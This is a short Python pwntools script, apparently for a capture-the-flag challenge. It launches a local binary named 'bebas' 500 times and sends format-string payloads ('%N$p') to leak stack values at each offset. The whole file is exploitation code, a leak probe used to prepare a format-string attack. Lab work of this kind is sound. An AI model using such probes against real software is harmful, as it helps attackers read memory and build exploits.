from pwn import *
elf = ELF('./bebas', checksec=False)
for i in range(1, 501):
    with context.local(log_level = 'error'):
        p = elf.process()
        p.sendlineafter(b'>>', '%{0:d}$p'.format(i).encode())
        print(i,p.recvline().strip()[4:-1].decode())
        p.close()
